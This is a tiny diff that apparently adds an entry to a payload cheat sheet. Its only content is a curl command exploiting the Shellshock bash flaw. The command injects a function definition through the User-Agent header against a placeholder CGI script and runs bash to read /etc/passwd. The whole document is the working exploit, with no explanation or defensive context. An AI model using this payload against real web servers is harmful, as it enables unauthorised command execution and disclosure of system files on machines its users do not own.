@@ -1,0 +1,2 @@
+# SHELLSHOCK
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
